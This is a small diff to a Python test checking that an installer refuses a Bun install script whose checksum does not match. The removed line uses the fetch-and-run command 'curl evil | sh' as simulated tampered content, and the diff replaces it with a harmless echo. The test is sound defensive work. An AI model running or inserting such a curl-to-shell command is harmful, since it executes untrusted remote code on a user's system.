@@ -62,7 +62,7 @@ def test_a_script_that_does_not_match_its_checksum_never_runs(
     no_tools.update(bash="bash", unzip="unzip")
 
     def tampered(url: str, target: Path) -> None:
-        target.write_bytes(b"curl evil | sh\n")
+        target.write_bytes(b"echo not the script we pinned\n")
 
     run = Recorder(creates=home / ".bun" / "bin" / "bun")
     ok, message = prereqs.install_bun("linux", run, tampered)
